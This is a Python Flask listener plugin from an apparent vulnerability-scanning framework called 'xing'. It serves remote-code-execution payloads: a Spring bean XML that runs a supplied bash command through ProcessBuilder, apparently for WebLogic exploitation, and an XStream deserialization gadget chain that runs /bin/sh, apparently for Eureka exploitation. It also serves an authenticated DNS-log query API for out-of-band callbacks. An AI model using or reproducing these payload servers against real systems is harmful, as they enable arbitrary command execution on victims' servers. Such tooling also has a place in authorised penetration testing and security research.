import base64
from flask import *
from xing.core import PluginType
from xing.core.BasePlugin import BasePlugin
from xing.conf import Conf
import sqlite3
import json


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.LISTENER
        self.app_name = 'HTTP API Server'
        self.vul_name = 'HTTP API Server'

    def listen(self, host, port):
        if port == 99999:
            port = 8080

        app = Flask(__name__)
        AUTH_TOKEN = Conf.HTTP_API_AUTH_TOKEN

        def auth():
            token = request.args.get('token')
            if Conf.HTTP_API_AUTH_ENABLE:
                if not token:
                    return False

                if token == AUTH_TOKEN:
                    return True

            else:
                return True

        @app.route('/')
        def index():
            return ''

        @app.route('/weblogic/<string:payload>/<path:path>')
        def weblogic_payload(payload, path):
            xml = '''<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[ %s ]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
            '''
            try:
                payload = base64.b64decode(payload).decode()
                xml = xml % payload
                return Response(xml, mimetype='application/xml')

            except:
                return Response(status=500, response='Error processing request')


        @app.route('/eureka/<string:payload>/<path:path>', methods=['GET', 'POST'])
        def eureka_payload(path, payload):
            try:
                payload = base64.b64decode(payload).decode()
                self.logger.debug('send payload with command: ' + payload)
                xml = """<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
      <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
              <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.Collections$EmptyIterator"/>
                  <next class="java.lang.ProcessBuilder">
                    <command>
                       <string>/bin/sh</string>
                       <string>-c</string>
                       <string>%s</string>
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next class="string">foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilder$NullInputStream"/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>""" % payload
                return Response(xml, mimetype='application/xml')

            except:
                return Response(status=500, response='Error processing request')

        def run_query(cur, params):
            size = params['size']
            page = params['page']
            domain = params['domain']
            source = params['source']
            flist = []
            stmt_count_base = 'SELECT count(*) FROM RECORD WHERE 1=1 '
            stmt_base = 'SELECT * FROM RECORD WHERE 1=1 '
            stmt_order = f' ORDER BY DATE DESC LIMIT {(page - 1) * size}, {size};'
            stmt_filter = ''
            rlist = []

            if domain:
                stmt_filter += 'AND DOMAIN LIKE ? '
                domain = f"%{params['domain']}%"
                flist.append(domain)

            if source:
                stmt_filter += 'AND SOURCE LIKE ? '

                source = f"%{params['source']}%"
                flist.append(source)

            count_stmt = stmt_count_base + stmt_filter + ';'
            self.logger.debug(f'execute query: {count_stmt}')
            cur.execute(count_stmt, flist)
            total = cur.fetchone()[0]

            stmt = stmt_base + stmt_filter + stmt_order
            cur.execute(stmt, flist)
            self.logger.debug(f'execute query: {stmt}')
            results = cur.fetchall()

            for result in results:
                src, dn, qt, qd = result
                data = {
                    'source': src,
                    'domain': dn,
                    'type': qt,
                    'date': qd
                }
                rlist.append(data)

            return total, rlist

        @app.route('/api/dns')
        def fetch_result():
            self.logger.debug(f'get request {request.url}')
            domain = request.args.get('domain', default='', type=str)
            source = request.args.get('source', default='', type=str)
            size = request.args.get('size', default=10, type=int)
            page = request.args.get('page', default=1, type=int)

            req_params = {
                'domain': domain,
                'source': source,
                'size': size,
                'page': page
            }

            self.logger.debug(f'request parameters:\ndomain: {domain}\nsource: {source}\nsize: {size}\npage: {page}')
            rjson = {
                'code': 200,
                'message': 'OK',
            }

            if not auth():
                rjson['code'] = 401
                rjson['message'] = 'unauthenticated'
                rjson = json.dumps(rjson)

                return Response(rjson, content_type='application/json')

            try:
                conn = sqlite3.connect(Conf.DNS_LOG_DB)
                cur = conn.cursor()
                total, rlist = run_query(cur, req_params)
                rjson['total'] = total
                rjson['result'] = rlist

                conn.close()

            except Exception as e:
                rjson['code'] = 500
                rjson['message'] = str(e)

            rjson = json.dumps(rjson)

            return Response(rjson, content_type='application/json')

        self.logger.info(f'served server on {host}:{port}')
        app.run(host, port=port, threaded=True)
